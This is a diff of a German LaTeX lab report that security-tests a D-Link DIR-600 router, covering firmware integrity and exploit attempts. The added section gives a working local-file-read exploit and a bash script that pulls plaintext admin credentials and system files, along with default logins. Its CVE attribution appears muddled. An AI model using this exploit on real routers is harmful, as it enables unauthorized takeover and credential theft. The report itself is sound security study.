@@ -511,35 +511,20 @@
 	freigegeben werden oder unsichere Protokolle aktiviert sind, führt dies dazu das theoretisch vorhandene
 	Mechanismen wirkungslos sind.
 
-	Administrative Zugriffskontrolle
-Authentifizierung
-Rollen (RBAC)
-Zugriffsbeschränkung (LAN only)
-sichere Protokolle
-Netzwerkbasierte Zugriffskontrolle
-Packet Filtering
-Stateful Firewall
-ACLs
-Strukturelle Zugriffskontrolle
-VLANs
-Gastnetzwerke
-Segmentierung
-Fehlkonfiguration als Risiko
-sehr gut, unbedingt behalten
-
 	%---Quelle(https://nvlpubs.nist.gov/nistpubs/Legac019-16920: y/SP/nistspecialpublication800-41r1.pdf)---%
 	%---Quelle(https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-44ver2.pdf)---%
 	
 	\subsection{Firmware Integrität}
 	\label{sec:Firmware Integrität}
-	Bei der Firmware Integrität beschreibt die Eigenschaft eines Routers, sicherzustellen, dass die auf dem
+	Die Firmware Integrität beschreibt die Eigenschaft eines Routers, sicherzustellen, dass die auf dem
 	Gerät laufende Firmware unverändert, authentisch und vertrauenswürdig ist. Dies ist ein zentraler
-	Sicherheitsmechanismus, da die Firmware das gesamte Gerät kontrolliert.
-	Die Firmware ist das eingebette Betriebssystem des Routers. Sollte ein Angreifer kontrolle über diese 
-	Ebene bekommen hat er vollständige kontrolle über den netzwerkverkehr, die Möglichkeit zur dauerhaften Persistenz
-	und kann alle höheren Sicherheitsmechanismen wie zb die Firewall umgehen. Der Router prüft daher beim start
-	und bei Updates, ob die Firmware echt und unverändert ist.
-	Technisch funktioniert das über Digitale Signatur. Der Hersteller des Routers signiert jedes Firware-Update.
+	Sicherheitsmechanismus, da die Firmware ein kritischer bestandteil der Gesamtarchitektur ist.
+	Die Firmware ist das eingebette Betriebssystem des Routers. 
+	Eine Kompromittierung der Firmware erlaubt es Angreifern vollständige kontrolle über das
+	gesamte Gerät zu erlangen, einschließlich der Manipulation der Netztwerkverkehrs, der Umgehung
+ 	von Sicherheitsmechanismen wie der Firewall sowie der Etablierung persistenter Schadsoftware.
+	Zur sicherstellung der Integrität wird in der Regel eine kryptographische Signaturprüfung eingesetzt.
+	Der Hersteller des Routers signiert jedes Firware-Update.
 	Ablauf:
 	\begin{itemize}
 		\item{Hersteller erzeugt Firmware}
@@ -595,51 +580,129 @@ sehr gut, unbedingt behalten
 	support:support
 	root:admin
 
-	Folgendes wurde noch nicht versucht:
-	\begin{itemize}
-		\item{Soft reset -> würde des factory default wiederherstellen}
-		\item{Hard reset -> würde alle konfigurationen zurücksetzten}
-		\item{Firmware reflash -> FTP (tftp 192.168.0.1, put firmware.bin) -> brauche offiziele Firmware, meine Quelle nicht vertrauenswürdig}
-	\end{itemize}
-
-	Exploit Testing: CVE-2019-16920: UPnP Remote Code Execution
-	Basierend auf folgenden Quellen:
-	https://nvd.nist.gov/vuln/detail/CVE-2019-16920
-	https://www.cve.org/CVERecord?id=CVE-2019-16920
-	\begin{figure}[h]
-		\hypertarget{tabelle1}{}
-		\begin{tabularx}{\columnwidth}{|X|X|X|}
-			\hline
-			Metasploit & use exploit/linux/http/dlink_upnp_msearch & Error: "The supplied module name is ambiguous." Fixed by using the full module path \\ 
-			\hline
-			Manual curl & SOAP request to /upnp/control/basicevent1 & Could trigger command injection (e.g., start a telnet server). \\
-			\hline
-			Python script & Custom UPnP exploit & Alternative zu Metasploit für CVE-2019-16920. \\
-			\hline
-		\end{tabularx}
-		\caption{Exploit Testing: CVE-2019-16920}
-	\end{figure}
-
-	-> Alle verusche schlugen fehl, kann aber auch an meine unwissendheit liegen
-
-	\begin{figure}[h]
-		\hypertarget{tabelle1}{}
-		\begin{tabularx}{\columnwidth}{|X|X|X|}
-			\hline
-			Metasploit & use exploit/multi/http/dlink_hnap_auth_bypass & Bypass Authentifizierung, stellt Session Cookie für admin zugang zur verfügung \\ 
-			\hline
-			Manual curl & HNAP SOAP request with Alphanetworks:Alphanetworks & Uses hardcoded credentials to bypass login. \\
-			\hline
-		\end{tabularx}
-		\caption{CVE-2017-17215: HNAP Auth Bypass}
-	\end{figure}
-
 	Router wurde reseted, durch langes drücken des Reset Knopfs.
 	Nutzer und Passwort wurden zurückgesetzt.
 	Nutzer: admin
 	Passwort: (blank)
 	Einloggen hat geklappt, Zugriff auf die Adminseite.
+
+	Da das Einloggen mithilfe des Standardpasswort nicht Funktioniert hat wurde der Rooter reseted
+	durch drücken der Reset Taste für 15 Sekunden.
+	Durch das reseten wurden alle vorgenommenen einstellungen des Routers zurückgesetzet eingenommen des Passworts.
+	Nun konnte die Einstellungen des Routers betretenmit Folgenden Passowrt:
+	Nutzer: admin
+	Passwort: (blank)
+
+	\subsection{Exploit Testing}
+	CVE-2017-17215 (HNAP Auth Bypass):
+	Laut dem CVE Verzeichniss hat der Router eine Schwachstelle in der Login Page.
+	Bei dieser wird an die URL http://192.168.0.1 folgender String angehängt:
+	/model/__show_info.php?REQUIRE_FILE=%2Fvar%2Fetc%2Fhttpasswd
+	Das ist URL Entschlüsselt REQUIRE_FILE=/var/etc/httpasswd
+
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/Passwort.png}
+		\caption{Seite nach Exploit}
+		\label{fig: Hallo}
+	\end{figure}
+
+	So kann anschließend der aktuelle Username so wie das Passwort des Routers ausgelesen werden.
+	Offenbar verarbeitet __show_info.php den Parameter REQUIRE_FILE folgendermaßen:
+	texttt{required(\$_GET['REQUIRED_FILE']);}
+	required() lädt beliebige Dateien aus dem Datei System, ohne Validierung oder Einschränkung.
+	Der Benutzter selbst kontrolliert direkt welche Dateien geladen werden.
+	Die Datei /var/etc/passwd enbthält für gewöhnlich Benutztername und Passowrt,
+	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei stehen.
+	Da die Login Seite hier komplett umgeangen wird von Authentication Bypass gesprochen.
+
+	Mit folgendem Skript wurden weitere befehle automatisisert getestet.
+	\begin{lstlisting}
+	#!/bin/bash
+
+	if [ $# -ne 1 ]; then
+		echo " Error: No IP-Adress"
+		exit
+	fi
+
+	IP_ADR=$1
+
+	FILES=(
+		"/var/etc/httpasswd"
+		"/var/log/messages"
+		"/proc/self/cmdline"
+		"/proc/self/environ"
+		"/proc/mounts"
+		"/proc/version"
+		"/proc/cpuinfo"
+		"/etc/hosts"
+	)
+
+	test_file() {
+	echo "------------------------------------"
+	echo "Test: $1"
+	echo "------------------------------------"
+	local encode
+	encode=$(printf "%s" "$1" | jq -sRr @uri)
+
+	curl -s "http://${IP_ADR}/model/__show_info.php?REQUIRE_FILE=${encode}" \
+		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+		-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+		-H 'Accept-Language: en-US,en;q=0.5' \
+		-H 'Accept-Encoding: gzip, deflate' \
+		-H 'Connection: keep-alive' \
+		-H 'Upgrade-Insecure-Requests: 1' \
+		-H 'Priority: u=0, i' \
+	| sed -e 's/<!--.*-->//g' \
+			-e 's/<[^>]*>//g' \
+			-e 's/&nbsp;//g' \
+			-e '/^\s*$/d'
+	}
+
+	for file in "${FILES[@]}"; do
+	test_file "$file"
+	done
+
+	exit
+	\end{lstlisting}
+
+	Der Befehl curl kann aus der Seite selbst herasukopiert werden, so kann sichhergestellt werden, das alle
+	Umgebungsvariablen passen. Zudem wurde das Paket jp installiert, so kann die Eingabe automatisch
+	richtig formatiert werden.
+
+	Durch /var/etc/httpasswd hat ein Angreifer vollen Zugriff auf das Webinterface und kann beliebige
+	Einstellungen am Router vornehmen, wie den DNS Server ändern um den Traffic umzuleiten, das Firmware-Update
+	manipulieren oder Remote Access aktivieren.
+	Mit /proc/version und /proc/cpuinfo lässt sich die Kernel Version und die Architecktur auslesen.
+	Diese Informationen können einem Angreifer dabei helfen die Richtigen Exploits sowie die Firmware-Reverse zu Engeneeren.
+	/proc/self/environ zeigt die Laufzeitumgebung. Der Webserver läuft bei diesem Router unter root was sehr kritisch ist.
+	Die Datei /var/log/messages enthält DHCP-Leases, die interne Netztwekstruktur, sowie die geräte MAC's. Dies kann nützlich sein,
+	für Netztwerk-Mapping und weitere Angriffe übers LAN.
+	Die Datei /etc/hosts bestätigt lediglich den Hostname und die Interne Struktur, ist aber weiter nicht kritisch.
 	
+	Der Befehl /proc/self/cmdline zeigt folgenden Output:
+	texttt{xmldb-nwrgn23_dlwbr_dir600b-t}
+	Das ist die CommandLine des Prozesses der die Webanfrage verarbeitet. Oft ist das ein Properitärer Dienst,
+	bei D-Link xmldb. Das ist der Konfigurations-/Datenbank Deamon des Routers.
+	nwrgn23_dlwbr_dir600b-t ist das Interne Modell bzw das Förmwaer Profil.
+	Daraus lässt sich herleiten, das das Webinterface eingebettet ist ind mit einem eigenen CGI-/Binnary Handler läuft.
+	
+	Der Befehl /proc/mounts hat den Output:
+	\begin{lstlisting}
+		rootfs / rootfs rw 0 0
+		/dev/root / squashfs ro 0 0
+		none /proc proc rw 0 0
+		sysfs /sys sysfs rw 0 0
+		ramfs /var ramfs rw 0 0
+	\end{lstlisting}
+	In Zeile 1 steht das initiale Root-Filesystem welches als Mount-Basis dient.
+	Zeile 2 zeigt den Ort wo die Firmwaer liegt, hier ist es SquashFS (read-only). das bedeutet, die Firmwar ist fest ins
+	Image eingebunden und lässt sich nicht zur laufzeit verändern.
+	In Zeile 3 steht das virtuelle Filesystem, welches Prozess- und Kernel Infos liefert.
+	Zeile 4 zeigt das Hardware und Kernel Interface. Es enthhält Geräteinfos und Treiberstatus, liefert allerdings wenig sicherheitskritische Informationen.
+	Zudem wird durch die Ausgabe deutlich, das /var im RAM liegt, siehe Zeile 5. Alle Daten die dort liegen, werden zur
+	Laufzeit generiert. Das erklärt wieso sich die Logdatei und die Passwörtzer auslesen lassen, da diese im /var Verzeichniss liegen.
+
 	%=======================notes jf - need to be deleted later
 	%testen was passiert wenn Router auf Werkseinstellungen ist
 	% -> kommt man dann einfach rein? ist wahrscheinlich sehr häufig der Fall
